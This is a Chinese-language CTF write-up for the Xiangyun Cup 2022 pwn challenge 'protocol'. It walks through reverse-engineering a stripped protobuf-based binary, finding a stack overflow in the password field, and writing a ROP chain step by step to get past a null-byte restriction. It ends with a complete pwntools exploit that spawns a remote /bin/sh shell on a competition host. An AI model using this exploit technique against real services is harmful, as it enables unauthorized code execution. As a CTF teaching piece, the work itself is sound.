---
title: 【祥云杯2022】PWN-WriteUp-protocol
index_img: img/article/protocol/image-20221101210554873.png
excerpt: 第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西
---
## 前言

第一次见到google protobuf类型的题目，虽然是到签到题，但还是学到了一些新的东西

## 逆向分析

首先导入文件，当我看到左侧密密麻麻的无名函数就感受到了一丝不对劲

![image-20221101210554873](img/article/protocol/image-20221101210554873.png)

先运行一下程序，发现输出了一个`Login:`

![image-20221101210642159](img/article/protocol/image-20221101210642159.png)

通过这个字符串定位到主函数位置

![image-20221101210733818](img/article/protocol/image-20221101210733818.png)

![image-20221101210746869](img/article/protocol/image-20221101210746869.png)

基本可以确定是去掉符号表了，这样直接逆向显然不太行。先看看程序编译的环境是什么，然后重新导入一个sig

![image-20221101210857157](img/article/protocol/image-20221101210857157.png)

成功确定版本`Ubuntu 9.4.0-1ubuntu1~20.04.1`,这个版本的libc应该是2.31，找一个对应的sig文件导入即可

> 这里推荐一个sig-database：[IDA FLIRT Signature Database](https://github.com/push0ebp/sig-database)
>
> 基本能找到绝大多数系统对应的sig

通过刚刚的`stirngs`基本可以确定是这个了，下下来然后放入，`IDA/sig/pc`目录

![image-20221101211407158](img/article/protocol/image-20221101211407158.png)

在IDA中导入，效果展示：

![image-20221101211626952](img/article/protocol/image-20221101211626952.png)

虽然还是有点难逆，但是好很多了，进入`sub_625110`函数

![image-20221101211743614](img/article/protocol/image-20221101211743614.png)

![image-20221101211735339](img/article/protocol/image-20221101211735339.png)

基本确定是个起到`strcpy`作用的函数，将我们输入的全局变量拷贝到栈上，但是不考虑目标地的大小，同样是有栈溢出。但是其中有几个限制

- 字符串中不能含有**\x00**（意味着不能直接使用ROP）
- 拷贝进入栈内时会在末尾添置一个**\x00**

![image-20221101211937850](img/article/protocol/image-20221101211937850.png)

保护也基本没开，大概可以直接利用。

## Google protobuf

在字符串内看到`google protobuf`,应该是这个相关题目

> 比赛的时候看这篇博客临时学习了一下：[2021第五空间 pb WP](https://bbs.pediy.com/thread-270004.htm)

![image-20221101212029433](img/article/protocol/image-20221101212029433.png)

### 配置环境

首先找到最新版本的protobuf：https://github.com/protocolbuffers/protobuf/releases
我这里下载的是：protobuf-cpp-3.21.9.tar.gz

下载并安装protobuf，注意需要**root**权限，且必须在root账户下操作，sudo+指令不太行

```shell
tar -xzvf protobuf-cpp-3.21.9.tar.gz
cd protobuf-3.21.9
./autogen.sh
./configure --prefix=/usr/local/protobuf
make -j8 && make install
ldconfig
```

安装完成之后，需要配置protobuf命令，更新环境变量

```shell
# 在/etc/profile文件中添加下面两行
export PATH=$PATH:/usr/local/protobuf/bin/
export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/
# 然后执行
source /etc/profile
```

配置动态链接库

```shell
# 在文件/etc/ld.so.conf中添加下面一行
/usr/local/protobuf/lib #（注意: 在新行处添加）
 
# 更改完成之后执行下面的命令
ldconfig
```

配置好相关环境后，按照如下操作，分解出了`ctf_pb2.py`和`ctf.proto`文件

使用自动化工具分析提取.py文件：https://github.com/marin-m/pbtk

```shell
pip3 install protobuf
./extractors/from_binary.py [-h] input_file [output_dir] # 得到ctf.ptoto

pip3 install google
pip3 install protobuf
protoc -I=./ --python_out=./ ctf.proto  # 得到ctf_pb2.py
```

![image-20221101212237685](img/article/protocol/image-20221101212237685.png)

> 如果显示没有proto指令，可以安装protobuf-compiler后再次尝试

```shell
sudo apt-get install protobuf-compiler
```

.proto文件里存放了message的结构信息

![image-20221101212357009](img/article/protocol/image-20221101212357009.png)

然后将py文件作为库导入，即可利用它的接口完成消息传递，我传递message的函数如下定义

```python
def new_pwn(payload):
    global io
    io.recvuntil('Login: ')
    person = pwn()
    person.username = b'admin'
    person.password = payload
    io.send(person.SerializeToString())
```

## 漏洞利用

综合上述分析，我们在送入password时存在溢出漏洞，但是ROP中的含有的**\x00**难以直接送入。但是我们可以利用while循环多次送入不同长度的字符串，使得字符串结尾添加的**\x00**被我们利用。同时需要注意的是，这种情况下，我们需要倒着一点一点写好ROP，**/bin/sh**的字符串我们可以在最后写入全局变量，只要记住对应地址即可，同时结束while循环调用ROP链。

![image-20221101214354465](img/article/protocol/image-20221101214354465.png)

### exp

```python
from ctf_pb2 import *
from pwn  import *


context(os='linux', arch='amd64',log_level='debug')


def new_pwn(payload):
    global io
    io.recvuntil('Login: ')
    person = pwn()
    person.username = b'admin'
    person.password = payload
    io.send(person.SerializeToString())
    
def clear(num):
    for i in range(1,8):
        payload = b'a'*0x248 + b'b'*num + b'c'*(8-i)
        new_pwn(payload)


def exp(mode,ip = '0.0.0.0',port = 0):
    global io
    if mode == 0:
        io = process('./protocol')
    else:
        io = remote(ip,port)
    
    #0x0000000000403c99 : syscall
    #binsh
    #0x0000000000404982 : pop rdi ; ret
    #0
    #0x0000000000588bbe : pop rsi ; ret
    #59
    #0x00000000005bdb8a : pop rax ; ret
    #0
    #0x000000000040454f : pop rdx ; ret
    
    payload = b'a'*0x248 +b'b'*0x40 + b'\x99\x3c\x40'
    new_pwn(payload)
    
    clear(0x38)
    payload = b'a'*0x248 + b'b'*0x38 + b'\x6f\xa3\x81'
    new_pwn(payload)
    
    clear(0x30)
    payload = b'a'*0x248 + b'b'*0x30 + b'\x82\x49\x40'
    new_pwn(payload)
    
    clear(0x28)
    payload = b'a'*0x248 + b'b'*0x28
    new_pwn(payload)
    
    clear(0x20)
    payload = b'a'*0x248 + b'b'*0x20 + b'\xbe\x8b\x58'
    new_pwn(payload)
    
    clear(0x18)
    payload = b'a'*0x248 + b'b'*0x18 + b'\x3b'
    new_pwn(payload)
    
    clear(0x10)
    payload = b'a'*0x248 + b'b'*0x10 + b'\x8a\xdb\x5b'
    new_pwn(payload)
    
    clear(0x8)
    payload = b'a'*0x248 + b'b'*0x08
    new_pwn(payload)
    
    clear(0x0)
    payload = b'a'*0x248 + b'b'*0x00 + b'\x4f\x45\x40'
    new_pwn(payload)
    
    pause()
    io.recvuntil('Login:')
    person = pwn()
    person.username = b'admin'
    person.password = b'admin'
    payload = person.SerializeToString() + b'\x00' + b'/bin/sh\x00'
    io.send(payload)
    
    
    io.interactive()

if __name__ == '__main__':
    exp(1,'210.30.97.133',28091)
```

